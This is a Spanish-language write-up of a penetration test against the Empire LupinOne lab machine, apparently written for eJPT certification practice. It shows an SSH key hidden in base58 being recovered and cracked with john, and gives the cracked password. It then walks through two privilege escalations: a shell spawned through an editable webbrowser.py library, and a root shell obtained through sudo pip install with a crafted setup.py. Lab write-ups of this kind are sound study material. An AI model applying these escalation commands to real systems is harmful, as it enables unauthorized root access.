# Informe de Pentesting - Empire LupinOne

**Máquina:** Empire LupinOne
**Autor:** Klauss Reyes Granados
**Certificación:** Preparación eJPT

---

## 🎯 Objetivo

Evaluar la seguridad de una máquina con múltiples capas de ocultamiento, servicios HTTP y clave privada SSH vulnerable.

---

## 🛰️ Recolección de Información

* Red: 192.1.1.0/24
* IP objetivo: 192.1.1.9
* Escaneo:

```bash
nmap -p- -sV -sS -Pn -n 192.1.1.9
```

---

## 🔎 Enumeración

### Puerto 80 - HTTP

* Se encuentra referencia a `~mifiles` y luego a `~secret`
* Acceso a fichero `.mysecret.txt` con clave en base58

### Decodificación

```bash
base58 -d .mysecret.txt > private.key
```

* Clave convertida con `ssh2john` y crackeada con `john`:

```bash
ssh2john private.key > hash
john hash --wordlist=rockyou.txt
```

* Usuario: `icex64`, Contraseña: `P@55w0rd!`

---

## 💥 Explotación

### SSH acceso con clave:

```bash
chmod 600 private.key
ssh -i private.key icex64@192.1.1.9
```

---

## ⬆️ Escalado de Privilegios

### Paso 1: Escalada a `arsene`

* Usuario puede ejecutar `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`
* `heist.py` usa `webbrowser` con permisos 777
* Se edita `webbrowser.py` para ejecutar shell:

```python
subprocess.run(["bash"])
```

### Paso 2: Escalada a root via pip

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

---

## 🚨 Vulnerabilidades Detectadas

| ID | Vulnerabilidad                              | Nivel   | Recomendación                                   |
| -- | ------------------------------------------- | ------- | ----------------------------------------------- |
| 1  | SSH key expuesta y cifrada públicamente     | Crítico | No exponer claves privadas ni siquiera cifradas |
| 2  | Permisos 777 sobre librerías usadas en sudo | Alto    | Eliminar permisos globales de escritura         |
| 3  | Acceso a pip con root                       | Crítico | Limitar ejecución de pip con sudo               |

---

## ✅ Conclusiones

* Acceso inicial mediante clave SSH oculta y cifrada
* Escalada utilizando vector poco común: librería Python editable
* La explotación de `pip` permite obtener root con facilidad

> Una máquina interesante para entender la relación entre configuración insegura, entorno Python y escalado creativo.
